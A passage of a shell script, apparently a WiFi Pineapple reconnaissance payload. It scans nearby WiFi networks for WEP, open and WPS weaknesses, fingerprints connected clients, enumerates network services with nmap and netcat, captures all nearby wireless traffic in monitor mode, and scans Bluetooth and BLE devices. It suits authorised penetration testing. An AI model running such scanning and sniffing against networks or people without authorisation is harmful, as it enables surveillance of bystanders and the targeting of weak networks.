        awk '/freq:/{print $2}' /tmp/wifi_detailed_scan.txt | sort | uniq -c | sort -rn | head -10 | while read count freq; do
            # Strip decimal portion for comparison (2412.0 -> 2412)
            freq_int=${freq%.*}
            # Convert frequency to channel
            if [ "$freq_int" -lt 3000 ] 2>/dev/null; then
                channel=$(echo "($freq_int - 2407) / 5" | bc 2>/dev/null); channel=${channel:-?}
                echo "  Channel $channel (${freq} MHz): $count networks"
            else
                channel=$(echo "($freq_int - 5000) / 5" | bc 2>/dev/null); channel=${channel:-?}
                echo "  Channel $channel (${freq} MHz - 5GHz): $count networks"
            fi
        done
        echo ""

        # Hidden SSIDs
        echo "** HIDDEN NETWORKS (Unnamed SSIDs) **"
        HIDDEN_COUNT=$(grep -c "SSID: $" /tmp/wifi_detailed_scan.txt 2>/dev/null); HIDDEN_COUNT=${HIDDEN_COUNT:-0}
        if [ "$HIDDEN_COUNT" -gt 0 ]; then
            awk '/^BSS/{bss=$2} /SSID: $/{print "  Hidden network - MAC:", bss}' /tmp/wifi_detailed_scan.txt
        fi
        echo "  Total hidden: $HIDDEN_COUNT"
        echo ""

        # Strong signal networks (close proximity)
        echo "** STRONG SIGNAL NETWORKS (Close Proximity) **"
        awk '/^BSS/{bss=$2} /SSID:/{ssid=$0} /signal:/{sig=$2; if(sig > -50) print ssid, "Signal:", sig, "dBm - MAC:", bss}' /tmp/wifi_detailed_scan.txt | head -15
        echo ""

        # 802.11 capabilities
        echo "** 802.11 STANDARDS DETECTED **"
        for std in "802.11n" "802.11ac" "802.11ax" "802.11b" "802.11g"; do
            count=$(grep -c "$std" /tmp/wifi_detailed_scan.txt 2>/dev/null); count=${count:-0}
            if [ "$count" -gt 0 ]; then
                echo "  $std: $count networks"
            fi
        done
        echo ""

        rm -f /tmp/wifi_detailed_scan.txt

    else
        # No scannable interface found
        echo "[!] NO SCANNABLE INTERFACES AVAILABLE"
        echo ""
        echo "WiFi security analysis requires an interface in managed mode."
        echo "Monitor mode and virtual AP interfaces cannot perform WiFi scans."
        echo ""
        echo "Available interfaces:"
        iw dev | grep -E "Interface|type" | sed 's/^/  /'
        echo ""
        echo "To enable scanning, you may need to:"
        echo "  1. Stop PineAP or recon mode temporarily"
        echo "  2. Or put an interface in managed mode: iw dev <iface> set type managed"
        echo ""
        # Set counts to 0 for summary
        WEP_COUNT=0
        OPEN_COUNT=0
        WPS_COUNT=0
        HIDDEN_COUNT=0
    fi

    # Summary of vulnerabilities
    echo "==================================="
    echo "VULNERABILITY SUMMARY"
    echo "==================================="
    echo "HIGH RISK:"
    echo "  - WEP Networks:        ${WEP_COUNT:-0} (Easily crackable)"
    echo "  - Open Networks:       ${OPEN_COUNT:-0} (No encryption)"
    echo "MEDIUM RISK:"
    echo "  - WPS Enabled:         ${WPS_COUNT:-0} (WPS PIN attack possible)"
    echo "  - Hidden Networks:     ${HIDDEN_COUNT:-0} (Security through obscurity)"
    echo ""
    echo "RECOMMENDATION: Target WEP and Open networks for testing."
    echo "WPS-enabled networks may be vulnerable to PIN brute-force attacks."
    echo ""

} > "${REPORT_DIR}/wireless/security_analysis.txt"

LOG "    [OK] WiFi security analysis complete"
LOG "    [!] Found ${WEP_COUNT} WEP networks, ${OPEN_COUNT} open networks, ${WPS_COUNT} WPS-enabled"

# Add to severity scoring
for i in $(seq 1 ${WEP_COUNT:-0}); do
    add_finding "HIGH" "WEP network detected (easily crackable encryption)"
done
for i in $(seq 1 ${OPEN_COUNT:-0}); do
    add_finding "MEDIUM" "Open network detected (no encryption)"
done
for i in $(seq 1 ${WPS_COUNT:-0}); do
    add_finding "MEDIUM" "WPS-enabled network detected (vulnerable to PIN attack)"
done
for i in $(seq 1 ${HIDDEN_COUNT:-0}); do
    add_finding "LOW" "Hidden SSID network detected"
done

# Connected clients (if hostapd is running)
if pgrep -x "hostapd" > /dev/null; then
    {
        echo "=== CONNECTED CLIENTS ==="
        echo "Timestamp: $(date)"
        echo ""
        for iface in wlan0 wlan1 wlan0-1 wlan1-1; do
            if [ -e "/sys/class/net/$iface" ]; then
                echo "--- Interface: $iface ---"
                iw dev "$iface" station dump
                echo ""
            fi
        done
    } > "${REPORT_DIR}/wireless/connected_clients.txt"

    CLIENT_COUNT=$(iw dev 2>/dev/null | grep -c "Station"); CLIENT_COUNT=${CLIENT_COUNT:-0}
    LOG "    [OK] ${CLIENT_COUNT} connected clients"
else
    LOG "    [!] No hostapd running"
    CLIENT_COUNT=0
fi

# ============================================================================
# ENHANCED CLIENT FINGERPRINTING
# ============================================================================

if [ "$ENABLE_CLIENT_FINGERPRINTING" = true ]; then
    LOG "[*] Performing enhanced client fingerprinting..."

{
    echo "=== ENHANCED CLIENT FINGERPRINTING ==="
    echo "Timestamp: $(date)"
    echo ""

    # Parse ARP cache for active hosts
    echo "--- ACTIVE HOSTS (ARP Cache) ---"
    arp -a | while read line; do
        hostname=$(echo "$line" | awk '{print $1}')
        ip=$(echo "$line" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}')
        mac=$(echo "$line" | grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}')

        if [ -n "$mac" ] && [ -n "$ip" ]; then
            vendor=$(lookup_mac_vendor "$mac")
            echo "  IP: $ip | MAC: $mac | Vendor: $vendor | Hostname: $hostname"
        fi
    done
    echo ""

    # Wireless client detailed info
    if [ "$CLIENT_COUNT" -gt 0 ]; then
        echo "--- WIRELESS CLIENT DETAILS ---"
        for iface in wlan0 wlan1 wlan0-1 wlan1-1; do
            if [ -e "/sys/class/net/$iface" ]; then
                iw dev "$iface" station dump 2>/dev/null | while read line; do
                    if echo "$line" | grep -q "^Station"; then
                        mac=$(echo "$line" | awk '{print $2}')
                        vendor=$(lookup_mac_vendor "$mac")
                        echo ""
                        echo "  Station: $mac (Vendor: $vendor)"
                    elif echo "$line" | grep -q "signal:"; then
                        echo "  $line"
                    elif echo "$line" | grep -q "rx bytes:\|tx bytes:"; then
                        echo "  $line"
                    fi
                done
            fi
        done
    fi
    echo ""

    # DHCP-based fingerprinting
    if [ -f /tmp/dhcp.leases ] || [ -f /var/lib/misc/dnsmasq.leases ]; then
        echo "--- DHCP CLIENT FINGERPRINTING ---"
        for lease_file in /tmp/dhcp.leases /var/lib/misc/dnsmasq.leases; do
            if [ -f "$lease_file" ]; then
                while read timestamp mac ip hostname client_id; do
                    if [ -n "$mac" ] && [ -n "$ip" ]; then
                        vendor=$(lookup_mac_vendor "$mac")
                        echo "  IP: $ip | MAC: $mac | Hostname: $hostname | Vendor: $vendor"

                        # Analyze hostname for OS hints
                        if echo "$hostname" | grep -qi "android\|samsung\|galaxy"; then
                            echo "    -> Likely Android device"
                        elif echo "$hostname" | grep -qi "iphone\|ipad\|macbook\|apple"; then
                            echo "    -> Likely Apple device"
                        elif echo "$hostname" | grep -qi "windows\|desktop\|laptop\|PC"; then
                            echo "    -> Likely Windows device"
                        elif echo "$hostname" | grep -qi "ubuntu\|debian\|fedora\|arch"; then
                            echo "    -> Likely Linux device"
                        fi
                    fi
                done < "$lease_file"
            fi
        done
    fi
    echo ""

    # Active ping sweep to detect TTL (OS fingerprinting)
    echo "--- OS DETECTION (TTL-based) ---"
    if command -v fping >/dev/null 2>&1; then
        network=$(ip route | grep -m1 "scope link" | awk '{print $1}')
        if [ -n "$network" ]; then
            fping -c 1 -t 100 -g "$network" 2>/dev/null | grep "alive" | while read line; do
                host=$(echo "$line" | awk '{print $1}')
                ttl=$(ping -c 1 -W 1 "$host" 2>/dev/null | grep "ttl=" | grep -oP "ttl=\K[0-9]+")
                if [ -n "$ttl" ]; then
                    os=$(detect_os_from_ttl "$ttl")
                    echo "  Host: $host | TTL: $ttl | Likely OS: $os"
                fi
            done
        fi
    else
        echo "  [!] fping not available, skipping ping sweep"
    fi

} > "${REPORT_DIR}/analysis/client_fingerprinting.txt"

    LOG "    [OK] Client fingerprinting complete"
else
    LOG "[*] Client fingerprinting skipped (QUICK scan mode)"
fi

# ============================================================================
# DHCP LEASES
# ============================================================================

LOG "[*] Collecting DHCP lease information..."

{
    echo "=== DHCP LEASES ==="
    if [ -f /tmp/dhcp.leases ]; then
        cat /tmp/dhcp.leases
    fi
    echo ""
    if [ -f /var/lib/misc/dnsmasq.leases ]; then
        cat /var/lib/misc/dnsmasq.leases
    fi
} > "${REPORT_DIR}/network/dhcp_leases.txt"

LEASE_COUNT=0
if [ -f /tmp/dhcp.leases ]; then
    LEASE_COUNT=$(wc -l < /tmp/dhcp.leases)
fi
LOG "    [OK] Captured ${LEASE_COUNT} DHCP leases"

# ============================================================================
# SERVICE DISCOVERY & ENUMERATION (using nmap + netcat)
# ============================================================================

if [ "$ENABLE_SERVICE_DISCOVERY" = true ]; then
    LOG ""
    LOG "[*] Performing service discovery..."

    # Get the upstream network for scanning (not the Pineapple's client network)
    # Strategy: Find the default gateway's interface, then get that interface's network

    # Get default gateway interface
    DEFAULT_IFACE=$(ip route | grep "^default" | head -1 | awk '{print $5}')

    if [ -n "$DEFAULT_IFACE" ]; then
        # Get the IP and subnet for that interface
        IFACE_INFO=$(ip addr show "$DEFAULT_IFACE" | grep "inet " | head -1)
        SCAN_NETWORK=$(echo "$IFACE_INFO" | awk '{print $2}')

        LOG "    [*] Upstream interface: $DEFAULT_IFACE"
        LOG "    [*] Scanning network: $SCAN_NETWORK"
    fi

    # Fallback: try to find any non-loopback, non-bridge network
    if [ -z "$SCAN_NETWORK" ]; then
        SCAN_NETWORK=$(ip route | grep -v "br-lan" | grep -v "127.0.0.0" | grep "scope link" | head -1 | awk '{print $1}')
    fi

    # Last resort fallback
    if [ -z "$SCAN_NETWORK" ]; then
        SCAN_NETWORK=$(ip route | grep -m1 "src" | awk '{print $1}')
        LOG "    [!] Using fallback network: $SCAN_NETWORK"
    fi

    # mDNS/Bonjour Discovery (UDP port 5353)
    # Added timeouts to prevent hanging on embedded systems
    {
        echo "=== mDNS/BONJOUR SERVICE DISCOVERY ==="
        echo "Timestamp: $(date)"
        echo ""

        if [ -n "$SCAN_NETWORK" ]; then
            echo "--- Scanning $SCAN_NETWORK for mDNS responders (UDP 5353) ---"
            echo ""
            timeout 30 nmap -sU -p 5353 --open --host-timeout 5s "$SCAN_NETWORK" 2>/dev/null | grep -E "^Nmap|^Host|5353/udp" || echo "Scan completed or timed out"
            echo ""
            echo "--- mDNS Query for services ---"
            # Query for common service types using DNS (with timeout per query)
            for service in _http._tcp.local _https._tcp.local _ssh._tcp.local _printer._tcp.local; do
                result=$(timeout 3 nslookup -type=PTR "$service" 224.0.0.251 2>/dev/null | grep -v "^;")
                if [ -n "$result" ]; then
                    echo "Service: $service"
                    echo "$result"
                    echo ""
                fi
            done
        else
            echo "[!] Could not determine local network"
        fi
    } > "${REPORT_DIR}/services/mdns_discovery.txt"
    LOG "    [OK] mDNS discovery complete"

    # NetBIOS Enumeration (UDP port 137, TCP port 139)
    # Added timeouts to prevent hanging on embedded systems
    {
        echo "=== NETBIOS ENUMERATION ==="
        echo "Timestamp: $(date)"
        echo ""

        if [ -n "$SCAN_NETWORK" ]; then
            echo "--- Scanning $SCAN_NETWORK for NetBIOS hosts ---"
            echo ""
            echo "UDP 137 (NetBIOS Name Service):"
            timeout 30 nmap -sU -p 137 --open --host-timeout 5s "$SCAN_NETWORK" 2>/dev/null | grep -E "^Nmap|^Host|137/udp" || echo "Scan completed or timed out"
            echo ""
            echo "TCP 139 (NetBIOS Session):"
            timeout 30 nmap -p 139 --open --host-timeout 5s "$SCAN_NETWORK" 2>/dev/null | grep -E "^Nmap|^Host|139/tcp" || echo "Scan completed or timed out"
        else
            echo "[!] Could not determine local network"
        fi
    } > "${REPORT_DIR}/services/netbios_enum.txt"
    LOG "    [OK] NetBIOS enumeration complete"

    # SNMP Discovery (UDP port 161)
    # Added timeouts to prevent hanging on embedded systems
    {
        echo "=== SNMP DISCOVERY ==="
        echo "Timestamp: $(date)"
        echo ""

        if [ -n "$SCAN_NETWORK" ]; then
            echo "--- Scanning $SCAN_NETWORK for SNMP hosts (UDP 161) ---"
            echo ""
            timeout 30 nmap -sU -p 161 --open --host-timeout 5s "$SCAN_NETWORK" 2>/dev/null | grep -E "^Nmap|^Host|161/udp" || echo "Scan completed or timed out"
        else
            echo "[!] Could not determine local network"
        fi
    } > "${REPORT_DIR}/services/snmp_discovery.txt"
    LOG "    [OK] SNMP discovery complete"

    # UPnP Discovery (UDP port 1900)
    # Wrapped in hard timeout to prevent hanging on embedded systems
    {
        echo "=== UPNP DEVICE DISCOVERY ==="
        echo "Timestamp: $(date)"
        echo ""

        echo "--- SSDP M-SEARCH Discovery ---"
        echo ""

        # Create temp file for SSDP response
        SSDP_TEMP=$(mktemp 2>/dev/null || echo "/tmp/ssdp_$$")

        # Run SSDP discovery with hard timeout (netcat can hang on embedded systems)
        (
            echo -e "M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n" | nc -u -w 2 239.255.255.250 1900 2>/dev/null | head -100
        ) > "$SSDP_TEMP" &
        NC_PID=$!

        # Hard kill after 8 seconds if still running
        sleep 8 && kill -9 $NC_PID 2>/dev/null &
        KILL_PID=$!

        # Wait for netcat to finish (or be killed)
        wait $NC_PID 2>/dev/null
        kill -9 $KILL_PID 2>/dev/null

        SSDP_RESPONSE=$(cat "$SSDP_TEMP" 2>/dev/null)
        rm -f "$SSDP_TEMP" 2>/dev/null

        if [ -n "$SSDP_RESPONSE" ]; then
            echo "$SSDP_RESPONSE"
            echo ""
            echo "--- UPnP Device Details ---"
            # Extract LOCATION URLs and fetch device descriptions (limit to first 3 to reduce hang risk)
            echo "$SSDP_RESPONSE" | grep -i "LOCATION:" | awk '{print $2}' | tr -d '\r' | head -3 | while read url; do
                if [ -n "$url" ]; then
                    echo "Device: $url"
                    # Use timeout with SIGKILL fallback
                    timeout -s KILL 3 curl -s --connect-timeout 1 --max-time 2 "$url" 2>/dev/null | grep -E "<friendlyName>|<modelName>|<manufacturer>" | sed 's/<[^>]*>//g' | sed 's/^/  /' || true
                    echo ""
                fi
            done
        else
            echo "No UPnP devices responded (or discovery timed out)"
        fi
    } > "${REPORT_DIR}/services/upnp_discovery.txt"
    LOG "    [OK] UPnP discovery complete"

    # SMB/CIFS Enumeration (TCP port 445)
    # Added timeouts to prevent hanging on embedded systems
    {
        echo "=== SMB/CIFS ENUMERATION ==="
        echo "Timestamp: $(date)"
        echo ""

        if [ -n "$SCAN_NETWORK" ]; then
            echo "--- Scanning $SCAN_NETWORK for SMB hosts (TCP 445) ---"
            echo ""
            # Add timeout to nmap scan (30 seconds max)
            SMB_HOSTS=$(timeout 30 nmap -p 445 --open --host-timeout 5s "$SCAN_NETWORK" 2>/dev/null || echo "Scan timed out")
            echo "$SMB_HOSTS" | grep -E "^Nmap|^Host|445/tcp|timed out"
            echo ""

            # Extract IPs and probe for more info (limit to first 5 hosts)
            echo "--- SMB Host Details ---"
            echo "$SMB_HOSTS" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | head -5 | while read ip; do
                echo "Host: $ip"
                # Try to get SMB banner/info via netcat with hard timeout
                timeout -s KILL 3 sh -c "echo '' | nc -w 1 '$ip' 445 2>/dev/null | hexdump -C | head -5" || true
                echo ""
            done
        else
            echo "[!] Could not determine local network"
        fi
    } > "${REPORT_DIR}/services/smb_enum.txt"
    LOG "    [OK] SMB enumeration complete"

    SERVICE_COUNT=$(find "${REPORT_DIR}/services/" -type f -exec grep -l ":" {} \; 2>/dev/null | wc -l)
    LOG "    [+] Discovered services in ${SERVICE_COUNT} categories"
else
    LOG "[!] Service discovery disabled"
fi

# ============================================================================
# TRAFFIC CAPTURE & WIRELESS RECONNAISSANCE
# ============================================================================

if [ "$PCAP_TIME" -gt 0 ]; then
    LOG ""
    LOG "[*] Starting traffic capture and wireless reconnaissance..."
    LOG "    Capture duration: ${PCAP_TIME} seconds"
    LOG ""

    LED SPECIAL

# Track created monitor interfaces for cleanup
MONITOR_IFACES=""
CHANNEL_HOP_PID=""
TCPDUMP_PIDS=""

# Function to find a phy that supports monitor mode
find_monitor_capable_phy() {
    # Check each physical device for monitor mode support
    for phy in /sys/class/ieee80211/phy*; do
        phy_name=$(basename "$phy")
        # Check if this phy supports monitor mode
        if iw phy "$phy_name" info 2>/dev/null | grep -A10 "Supported interface modes" | grep -q "monitor"; then
            echo "$phy_name"
            return 0
        fi
    done
    return 1
}

# Function to create monitor interface on a phy WITHOUT disturbing existing interfaces
# This allows PineAP to keep running while we sniff
create_monitor_on_phy() {
    local phy="$1"
    local mon_name="$2"

    # Check if our monitor interface already exists
    if [ -e "/sys/class/net/$mon_name" ]; then
        # Check if it's actually in monitor mode
        if iw dev "$mon_name" info 2>/dev/null | grep -q "type monitor"; then
            ip link set "$mon_name" up 2>/dev/null
            LOG "        [*] Using existing monitor interface: $mon_name"
            echo "$mon_name"
            return 0
        else
            # Interface exists but not in monitor mode, delete and recreate
            ip link set "$mon_name" down 2>/dev/null
            iw dev "$mon_name" del 2>/dev/null
            sleep 0.5
        fi
    fi

    # Create a NEW monitor interface on this phy
    # This doesn't affect any existing interfaces (PineAP keeps running!)
    LOG "        [*] Creating monitor interface $mon_name on $phy..."
    iw phy "$phy" interface add "$mon_name" type monitor 2>/dev/null

    if [ $? -eq 0 ] && [ -e "/sys/class/net/$mon_name" ]; then
        # Bring it up
        ip link set "$mon_name" up 2>/dev/null
        if [ $? -eq 0 ]; then
            LOG "        [+] Monitor interface $mon_name created successfully"
            echo "$mon_name"
            return 0
        else
            LOG "        [!] Failed to bring up $mon_name"
            iw dev "$mon_name" del 2>/dev/null
        fi
    else
        LOG "        [!] Failed to create $mon_name on $phy"
    fi

    return 1
}

# Function to cleanup monitor interface (simple - just delete it)
cleanup_monitor() {
    local mon_iface="$1"

    if [ -n "$mon_iface" ] && [ -e "/sys/class/net/$mon_iface" ]; then
        LOG "        [*] Removing monitor interface: $mon_iface"
        ip link set "$mon_iface" down 2>/dev/null
        iw dev "$mon_iface" del 2>/dev/null
    fi
}

# Function to hop through WiFi channels
channel_hopper() {
    local iface="$1"
    local interval="$2"

    # Combine 2.4GHz and 5GHz channels
    local all_channels="$CHANNELS_24GHZ $CHANNELS_5GHZ"

    while true; do
        for channel in $all_channels; do
            iw dev "$iface" set channel "$channel" 2>/dev/null
            sleep "$interval"
        done
    done
}

# =============================================================================
# WIRELESS RECONNAISSANCE (Monitor Mode - Nearby WiFi Traffic)
# =============================================================================

if [ "$ENABLE_WIRELESS_RECON" = true ]; then
    LOG "[*] WIRELESS RECONNAISSANCE MODE"
    LOG "    Target: All nearby WiFi networks"
    LOG "    Note: PineAP and other services will continue running"
    LOG ""

    # Find a physical device that supports monitor mode
    if [ "$RECON_PHY" = "auto" ]; then
        LOG "    [*] Auto-detecting monitor-capable wireless device..."
        RECON_PHY=$(find_monitor_capable_phy)
    fi

    if [ -n "$RECON_PHY" ]; then
        LOG "    [+] Using physical device: $RECON_PHY"

        # Show existing interfaces on this phy (for info)
        LOG "    [*] Existing interfaces on $RECON_PHY:"
        iw dev 2>/dev/null | grep -A1 "phy#${RECON_PHY#phy}" | grep Interface | awk '{print "        - " $2}'

        # Create a NEW monitor interface (doesn't disturb existing ones!)
        RECON_MON=$(create_monitor_on_phy "$RECON_PHY" "$RECON_MON_NAME")

        if [ -n "$RECON_MON" ] && [ -e "/sys/class/net/$RECON_MON" ]; then
            MONITOR_IFACES="$RECON_MON"
            LOG "    [+] Monitor interface ready: $RECON_MON"

            # Start channel hopping in background
            if [ "$CHANNEL_HOP" = true ]; then
                LOG "    [+] Starting channel hopper (${CHANNEL_HOP_INTERVAL}s interval)..."
                channel_hopper "$RECON_MON" "$CHANNEL_HOP_INTERVAL" &
                CHANNEL_HOP_PID=$!
            else
                # Set to a common channel if not hopping
                iw dev "$RECON_MON" set channel 6 2>/dev/null
                LOG "    [+] Fixed channel mode (channel 6)"
            fi

            # Capture ALL wireless traffic (not just management frames)
            LOG "    [+] Starting wireless captures..."
            timeout ${PCAP_TIME} tcpdump -i "$RECON_MON" -s ${PCAP_SNAPLEN} \
                -w "${REPORT_DIR}/pcaps/wireless_recon_${TIMESTAMP}.pcap" \
                -c ${PCAP_COUNT} 2>/dev/null &
            TCPDUMP_PIDS="$!"

            # Also capture just probe requests for quick analysis
            timeout ${PCAP_TIME} tcpdump -i "$RECON_MON" -s ${PCAP_SNAPLEN} \
                -w "${REPORT_DIR}/pcaps/probe_requests_${TIMESTAMP}.pcap" \
                -c ${PCAP_COUNT} 'type mgt subtype probe-req' 2>/dev/null &
            TCPDUMP_PIDS="$TCPDUMP_PIDS $!"

            # Capture beacon frames (AP advertisements)
            timeout ${PCAP_TIME} tcpdump -i "$RECON_MON" -s ${PCAP_SNAPLEN} \
                -w "${REPORT_DIR}/pcaps/beacons_${TIMESTAMP}.pcap" \
                -c ${PCAP_COUNT} 'type mgt subtype beacon' 2>/dev/null &
            TCPDUMP_PIDS="$TCPDUMP_PIDS $!"

            # Capture deauth/disassoc frames (potential attacks)
            timeout ${PCAP_TIME} tcpdump -i "$RECON_MON" -s ${PCAP_SNAPLEN} \
                -w "${REPORT_DIR}/pcaps/deauth_${TIMESTAMP}.pcap" \
                -c ${PCAP_COUNT} 'type mgt subtype deauth or type mgt subtype disassoc' 2>/dev/null &
            TCPDUMP_PIDS="$TCPDUMP_PIDS $!"

            LOG "    [+] Captures started on $RECON_MON"

        else
            LOG "    [!] ERROR: Could not create monitor interface on $RECON_PHY"
            LOG "    [!] This may happen if the radio doesn't support multiple interfaces"
        fi
    else
        LOG "    [!] ERROR: No monitor-capable wireless device found"
        LOG "    [!] Available physical devices:"
        for phy in /sys/class/ieee80211/phy*; do
            phy_name=$(basename "$phy")
            LOG "        - $phy_name"
            iw phy "$phy_name" info 2>/dev/null | grep -A5 "Supported interface modes" | grep -E "^\s+\*" | sed 's/^/            /'
        done
    fi

    LOG ""
fi

# =============================================================================
# LOCAL NETWORK CAPTURE (br-lan - Pineapple's own network)
# =============================================================================

LOG "[*] LOCAL NETWORK CAPTURE"
LOG "    Target: Pineapple's connected clients (br-lan)"
LOG ""

if [ -e "/sys/class/net/br-lan" ]; then
    LOG "    [+] Capturing on br-lan (bridged client traffic)..."
    timeout ${PCAP_TIME} tcpdump -i br-lan -s ${PCAP_SNAPLEN} \
        -w "${REPORT_DIR}/pcaps/local_network_${TIMESTAMP}.pcap" \
        -c ${PCAP_COUNT} 'not arp' 2>/dev/null &
    TCPDUMP_PIDS="$TCPDUMP_PIDS $!"
else
    LOG "    [!] br-lan interface not found"
fi

LOG ""

# =============================================================================
# CAPTURE PROGRESS
# =============================================================================

LOG "[*] Capture in progress..."
LOG ""

# Progress indicator with channel info during capture
capture_end=$(($(date +%s) + PCAP_TIME))
while [ $(date +%s) -lt $capture_end ]; do
    remaining=$((capture_end - $(date +%s)))
    if [ "$CHANNEL_HOP" = true ] && [ -n "$RECON_MON" ]; then
        current_channel=$(iw dev "$RECON_MON" info 2>/dev/null | grep channel | awk '{print $2}')
        LOG "    >>> ${remaining}s remaining | Channel: ${current_channel:-?}"
    else
        LOG "    >>> ${remaining}s remaining"
    fi
    sleep 5
done

# Wait for all captures to complete
for pid in $TCPDUMP_PIDS; do
    wait $pid 2>/dev/null
done

LOG ""
LOG "    [OK] Traffic capture complete"

# =============================================================================
# CLEANUP
# =============================================================================

# Stop channel hopper
if [ -n "$CHANNEL_HOP_PID" ]; then
    kill $CHANNEL_HOP_PID 2>/dev/null
    wait $CHANNEL_HOP_PID 2>/dev/null
    LOG "    [+] Stopped channel hopper"
fi

# Cleanup monitor interfaces
for mon_iface in $MONITOR_IFACES; do
    cleanup_monitor "$mon_iface"
    LOG "    [+] Cleaned up monitor interface: $mon_iface"
done

# =============================================================================
# POST-CAPTURE VALIDATION
# =============================================================================

LOG ""
LOG "[*] Validating capture files..."

for pcap in "${REPORT_DIR}"/pcaps/*.pcap; do
    if [ -f "$pcap" ]; then
        packet_count=$(tcpdump -r "$pcap" 2>/dev/null | wc -l | tr -d ' ')
        filename=$(basename "$pcap")

        if [ "$packet_count" -eq 0 ] 2>/dev/null; then
            rm -f "$pcap"
            LOG "    [!] Removed empty: $filename"
        else
            LOG "    [+] $filename: $packet_count packets"
        fi
    fi
done

# Summary
    valid_pcaps=$(ls -1 "${REPORT_DIR}"/pcaps/*.pcap 2>/dev/null | wc -l)
    if [ "$valid_pcaps" -eq 0 ]; then
        LOG ""
        LOG "    [!] WARNING: No packets captured!"
        LOG "    [!] Check that:"
        LOG "            - WiFi interface supports monitor mode"
        LOG "            - There are nearby WiFi networks"
        LOG "            - Antenna is connected properly"
    else
        LOG ""
        LOG "    [OK] $valid_pcaps capture file(s) with data"
    fi

    LOG ""
else
    LOG ""
    LOG "[*] Traffic capture skipped (QUICK scan mode)"
    LOG ""
fi

# ============================================================================
# BLUETOOTH/BLE DEVICE SCANNING
# ============================================================================

if [ "$ENABLE_BLUETOOTH_SCAN" = true ]; then
    LOG "[*] Scanning for Bluetooth/BLE devices..."

    {
        echo "=== BLUETOOTH DEVICE SCAN ==="
        echo "Timestamp: $(date)"
        echo ""
        echo "Purpose: Detect nearby Bluetooth devices that may be:"
        echo "  - Potential attack vectors (Bluetooth-enabled devices)"
        echo "  - IoT devices with weak security"
        echo "  - Mobile devices for forensic correlation"
        echo "  - Bluetooth-based tracking/beacons"
        echo ""

        # Check for Bluetooth adapter
        BT_ADAPTER_FOUND=false

        # Classic Bluetooth scan using hcitool
        echo "** CLASSIC BLUETOOTH DEVICES **"
        if check_tool hcitool; then
            # Check if adapter exists
            if hciconfig 2>/dev/null | grep -q "hci"; then
                BT_ADAPTER_FOUND=true
                echo "  Scanning for discoverable devices (15 seconds)..."
                echo ""

                # Bring up the adapter if down
                hciconfig hci0 up 2>/dev/null

                bt_results=$(timeout 15 hcitool scan 2>/dev/null)
                if [ -n "$bt_results" ] && [ "$bt_results" != "Scanning ..." ]; then
                    echo "$bt_results" | grep -v "^Scanning" | while read mac name; do
                        if [ -n "$mac" ]; then
                            # Get device class info if available
                            class_info=$(timeout 3 hcitool info "$mac" 2>/dev/null | grep "Class:" | head -1)
                            echo "  Device: $mac"
                            echo "    Name: ${name:-Unknown}"
                            [ -n "$class_info" ] && echo "    $class_info"
                            echo ""
                        fi
                    done
                    BT_DEVICE_COUNT=$(echo "$bt_results" | grep -v "^Scanning" | grep -c ":")
                    BT_DEVICE_COUNT=${BT_DEVICE_COUNT:-0}
                    echo "  Total Classic Bluetooth devices: $BT_DEVICE_COUNT"
                else
                    echo "  No discoverable Bluetooth devices found"
                    echo "  (Devices may be in non-discoverable mode)"
                    BT_DEVICE_COUNT=0
                fi
            else
                echo "  No Bluetooth adapter detected"
                BT_DEVICE_COUNT=0
            fi
        else
            echo "  hcitool not available - skipping classic Bluetooth scan"
            BT_DEVICE_COUNT=0
        fi
        echo ""

        # BLE (Bluetooth Low Energy) scan
        echo "** BLUETOOTH LOW ENERGY (BLE) DEVICES **"
        echo "  Scanning for BLE devices (30 seconds)..."
        echo "  Note: BLE scan requires root privileges"
        echo ""

        # Ensure Bluetooth adapter is up and powered
        if check_tool hciconfig; then
            hciconfig hci0 up 2>/dev/null
            sleep 1
        fi

        # Method 1: Use hcitool lescan (most reliable for passive scanning)
        if check_tool hcitool; then
            echo "  [*] Starting BLE discovery scan..."

            # Clear any previous scan data
            rm -f /tmp/ble_scan_hci.txt

            # Start lescan in background
            hcitool lescan --duplicates > /tmp/ble_scan_hci.txt 2>&1 &
            LESCAN_PID=$!

            # Let it scan for 30 seconds
            sleep 30

            # Stop the scan
            kill -2 $LESCAN_PID 2>/dev/null
            sleep 1
            kill -9 $LESCAN_PID 2>/dev/null
            wait $LESCAN_PID 2>/dev/null

            echo "  [*] Processing discovered devices..."
            echo ""

            # Parse results and create a smart deduplication
            # Strategy: For each MAC, prefer entries with actual names over "(unknown)"
            cat /tmp/ble_scan_hci.txt 2>/dev/null | grep -E "^[0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}" > /tmp/ble_raw.txt

            # Process each unique MAC address
            cat /tmp/ble_raw.txt | awk '{print $1}' | sort -u > /tmp/ble_macs.txt

            if [ -s /tmp/ble_macs.txt ]; then
                # For each unique MAC, find the best name
                while IFS= read -r mac; do
                    # Get all entries for this MAC
                    entries=$(grep "^$mac" /tmp/ble_raw.txt)

                    # Try to find an entry with a real name (not "(unknown)")
                    named_entry=$(echo "$entries" | grep -v "(unknown)" | head -1)

                    if [ -n "$named_entry" ]; then
                        # Use the named entry
                        name=$(echo "$named_entry" | sed 's/^[0-9A-Fa-f:]\+ //')
                    else
                        # Fall back to first entry (which is "(unknown)")
                        name=$(echo "$entries" | head -1 | sed 's/^[0-9A-Fa-f:]\+ //')
                    fi

                    echo "  BLE Device: $mac"
                    if [ -n "$name" ] && [ "$name" != "$mac" ] && [ "$name" != "(unknown)" ]; then
                        echo "    Name: $name"
                    else
                        echo "    Name: (Unknown/Not Advertising Name)"
                    fi

                    # Try to get additional info using bluetoothctl if available
                    if check_tool bluetoothctl; then
                        device_info=$(timeout 2 bluetoothctl info "$mac" 2>/dev/null)
                        if [ -n "$device_info" ]; then
                            rssi=$(echo "$device_info" | grep "RSSI:" | awk '{print $2}')
                            [ -n "$rssi" ] && echo "    RSSI: ${rssi} dBm"

                            paired=$(echo "$device_info" | grep "Paired:" | awk '{print $2}')
                            [ "$paired" = "yes" ] && echo "    Status: Previously Paired"
                        fi
                    fi

                    echo ""
                done < /tmp/ble_macs.txt

                BLE_DEVICE_COUNT=$(wc -l < /tmp/ble_macs.txt | tr -d ' ')
                echo "  Total BLE devices discovered: $BLE_DEVICE_COUNT"
            else
